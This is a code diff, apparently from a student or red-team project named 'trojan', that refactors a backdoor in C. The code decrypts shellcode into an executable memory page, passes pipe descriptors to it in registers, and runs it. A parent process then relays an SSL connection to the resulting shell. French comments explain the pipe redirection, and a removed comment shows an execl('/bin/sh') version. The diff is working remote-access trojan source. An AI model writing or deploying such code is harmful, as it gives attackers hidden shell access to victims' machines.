@@ -1,34 +1,20 @@
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/select.h>
-#include <string.h>
-#include <openssl/ssl.h>
 #include "trojan.h"
 
-/* dup2(to_shell[0], 0); // le shell lit sur stdin ce que le parent écrit (le client)
-  dup2(from_shell[1], 1); // le shell écrit son stdout dans le pipe vers le parent
-  dup2(from_shell[1], 2);  // pareil pour stderr
-  close(to_shell[1]);      // on le ferme car le shell n'écrit pas dans ce pipe
-  close(from_shell[0]);    // le shell ne lit pas dans ce pipe
-  execl("/bin/sh", "sh", NULL);
-  exit(1); */
-void call_shellcode(int *to_shell, int *from_shell) {
+
+void exec(int *to_shell, int *from_shell) {
    
-    /* informer le compilateur qu’il ne doit déplacer avant l’appel */
     unsigned char *dest = mmap(NULL, 200, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-
     get_plaintext(dest);
-    register long fd_stdin  asm("rdi") = to_shell[0];
-    register long fd_stdout asm("r8")  = from_shell[1];
-    register long fd_close1 asm("rdx") = to_shell[1];
-    register long fd_close2 asm("rcx") = from_shell[0];
 
-    (void)fd_stdin; (void)fd_stdout; (void)fd_close1; (void)fd_close2;
-    ((void(*)())dest)();
-    // __asm__ __volatile__ ("" ::: "memory");
-    //((void(*)())shellcode)();
-    exit(1);
+    __asm__ __volatile__ (
+        "movq %0, %%rdi; movq %1, %%r8; movq %2, %%rdx; movq %3, %%rcx;"
+        :
+        : "r"((long)to_shell[0]), "r"((long)from_shell[1]), "r"((long)to_shell[1]), "r"((long)from_shell[0])
+        : "rdi", "r8", "rdx", "rcx"
+    );
+
+    ((void(*)())dest)(); /// https://medium.com/@lsecqt/red-teaming-101-executing-malicious-shellcode-with-c-a-guide-for-beginners-439bff63721d
+    _exit(1);
 }
 
 void handle_shell(SSL *ssl)
@@ -40,12 +26,11 @@ void handle_shell(SSL *ssl)
         return;
 
     pid_t pid = fork();
-    if (pid == 0) {
-        call_shellcode(to_shell, from_shell);
-    }
+    if (pid == 0)
+        exec(to_shell, from_shell);
 
-    close(to_shell[0]);
-    close(from_shell[1]);
+    close(to_shell[0]); // le parent ne lit pas dans ce pipe et écrit dans to_shell[1] redirigé vers stdin du shell
+    close(from_shell[1]);  // le parent n’écrit pas la sortie du shell et lit depuis from_shell[0]
 
     fd_set readfds;
     while (1) {
